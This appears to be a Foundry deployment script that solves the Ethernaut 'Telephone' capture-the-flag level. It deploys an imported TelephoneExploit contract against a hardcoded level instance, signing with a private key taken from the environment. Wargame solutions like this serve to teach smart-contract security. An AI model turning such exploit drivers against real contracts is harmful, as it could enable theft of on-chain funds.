// SPDX-License-Identifier: CC-BY-4.0
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Telephone} from "src/04/Telephone.sol";
import {TelephoneExploit} from "src/04/TelephoneExploit.sol";

contract Exploit is Script {

        address levelInstance = 0x63f80459C2CBa9692DFA70eD43c66423a9596c02;
        address hacker = vm.envAddress("PUBLIC_KEY");

        Telephone level = Telephone(levelInstance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            
            TelephoneExploit exploit = new TelephoneExploit();
            exploit.run(level);

            vm.stopBroadcast();
    }
}